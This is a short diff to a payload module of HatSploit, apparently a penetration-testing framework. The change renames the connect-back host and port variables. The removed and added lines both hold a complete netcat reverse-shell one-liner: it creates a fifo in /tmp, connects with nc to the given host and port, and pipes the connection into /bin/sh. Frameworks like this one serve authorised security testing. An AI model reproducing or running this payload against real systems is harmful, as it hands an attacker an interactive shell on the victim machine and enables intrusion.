@@ -26,10 +26,10 @@ class HatSploitPayload(Payload, StringTools):
     }
 
     def run(self):
-        connback_host = self.handler['CBHOST']
-        connback_port = self.handler['CBPORT']
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
         filename = self.random_string(8)
-        payload = f"mkfifo /tmp/{filename}; nc {connback_host} {connback_port} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"
+        payload = f"mkfifo /tmp/{filename}; nc {remote_host} {remote_port} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"
 
         return payload
